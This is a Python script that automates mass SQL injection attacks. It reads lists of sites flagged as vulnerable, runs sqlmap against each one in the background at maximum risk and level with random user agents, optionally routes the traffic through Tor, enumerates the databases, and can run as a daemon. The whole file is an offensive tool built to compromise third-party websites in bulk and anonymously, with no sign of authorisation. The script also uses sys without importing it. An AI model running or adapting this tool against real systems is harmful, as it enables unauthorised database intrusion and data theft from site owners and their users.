import time
import os
from random import randint
import requests
from functions import get_site,get_domain_name,get_number,myprint

TOR=os.getenv("TOR")=="True"
MAX_THREADS=os.getenv("MAX_THREADS")
if MAX_THREADS!=None:
	MAX_THREADS=int(MAX_THREADS)
PRIORITY_FILE=os.getenv("PRIORITY_FILE")
ERROR_FILE=os.getenv("ERROR_FILE")
SQLMAP_PATH=os.getenv("SQLMAP_PATH")




def get_sqlmap_threads():#
	return int(int(os.popen("ps aux | grep sqlmap | sed -E '/sh -c/d' | sed -E '/grep/d' | wc -l | sed -E 's/ *//'").readline()[0:-1]))


def exploit():

	priority_file_number = get_number(PRIORITY_FILE)

	error_file_number = get_number(ERROR_FILE)

	os.system("mkdir working")
	os.system("mkdir finished")
	os.system("mkdir dbs")
	os.system("mkdir maybe")
	while priority_file_number == 0 and error_file_number == 0:
		myprint( "Waiting for sites to come\n" )
		time.sleep(60)

		priority_file_number = get_number(PRIORITY_FILE)

		error_file_number = get_number(ERROR_FILE)

	while priority_file_number > 0 or error_file_number > 0:

		while get_sqlmap_threads() > MAX_THREADS:
			myprint("Waiting for others to finish exploit\n")
			time.sleep(100)

		else:

			if priority_file_number > 0:
				site = get_site(PRIORITY_FILE)

			else:
				site = get_site(ERROR_FILE)

			priority_file_number = get_number(PRIORITY_FILE)

			error_file_number = get_number(ERROR_FILE)

			if site[len(site) - 1] == '\n':
				site = site[0:len(site) - 1]
			site_file = get_domain_name(site)
			random_int1 = randint(0, 9)
			random_int2 = randint(0, 9)
			myprint("executing exploit for " +site_file +"\n")
			if TOR:
				command = ' ( echo "%s" >  working/%s.%s.txt ;  nohup python %ssqlmap.py  --tor --tor-type=SOCKS5 -u "%s" --batch --risk 3 --level 5 --random-agent --dbs >> working/%s.%s.txt ; mv working/%s.%s.txt finished/%s.%s.txt ) & ' % (site, site_file,str(random_int1) + str(random_int2), SQLMAP_PATH + "/sqlmap/", site, site_file, str(random_int1) + str(random_int2), site_file, str(random_int1) + str(random_int2), site_file, str(random_int1) + str(random_int2))
			else:
				command = ' ( echo "%s" >  working/%s.%s.txt ;  nohup python %ssqlmap.py -u "%s" --batch --risk 3 --level 5 --random-agent --dbs >> working/%s.%s.txt ; mv working/%s.%s.txt finished/%s.%s.txt ) & ' % (site, site_file,str(random_int1) + str(random_int2), SQLMAP_PATH + "/sqlmap/", site, site_file, str(random_int1) + str(random_int2), site_file, str(random_int1) + str(random_int2), site_file, str(random_int1) + str(random_int2))
			os.system(command)
			while priority_file_number == 0 and error_file_number == 0:
				myprint( "Waiting for sites to come\n" )
				time.sleep(50)

				priority_file_number = get_number(PRIORITY_FILE)

				error_file_number = get_number(ERROR_FILE)

	else:
		myprint( "no sites to test" )




def main():
	exit_err=False
	if PRIORITY_FILE==None:
		myprint("Error : You need to set PRIORITY_FILE\nTry : export PRIORITY_FILE=\"sqlVulnerable.txt\"")
		exit_err=True
	if ERROR_FILE==None:
		myprint("Error : You need to set ERROR_FILE\nTry : export ERROR_FILE=\"maybeVulnerable.txt\"")
		exit_err=True
	if MAX_THREADS==None:
		myprint("Error : You need to set MAX_THREADS\nTry : export MAX_THREADS=4")
		exit_err=True
	if TOR==None:
		myprint("Error : You need to set TOR\nTry : export TOR=False")
		exit_err=True
	if SQLMAP_PATH==None:
		myprint("Error : You need to set SQLMAP_PATH\nTry : export SQLMAP_PATH=..")
		exit_err=True
	if exit_err:
		exit(-1)

	if not os.path.isfile(PRIORITY_FILE):
		with open(PRIORITY_FILE,mode="w") as new_file:
			new_file.close() 

	if not os.path.isfile(ERROR_FILE):
		with open(ERROR_FILE,mode="w") as new_file:
			new_file.close() 

	if not os.path.exists(SQLMAP_PATH+"/sqlmap"):
		myprint("Getting sqlmap")
		os.system("git clone https://github.com/sqlmapproject/sqlmap.git "+SQLMAP_PATH+"/sqlmap")
	else:
		myprint("Updating sqlmap")
		os.system("git -C "+SQLMAP_PATH+"/sqlmap pull")

	if TOR:
		try:
			session = requests.session()
			session.proxies = {}
			session.proxies['http'] = 'socks5://localhost:9050'
			session.proxies['https'] = 'socks5://localhost:9050'
			session.get('https://check.torproject.org/')
		except:
			myprint("Error : You activated TOR option but you dont have tor running , run or install it or disable tor")
			exit(-1)
		

	exploit()

if __name__ == '__main__':
	if len(sys.argv)==2 and (sys.argv[1]=="-d" or sys.argv[1]=="--daemon") :
		pid=os.fork()
		
		if pid!=0:
			exit(0)		
	myprint(os.getpid())
	main()
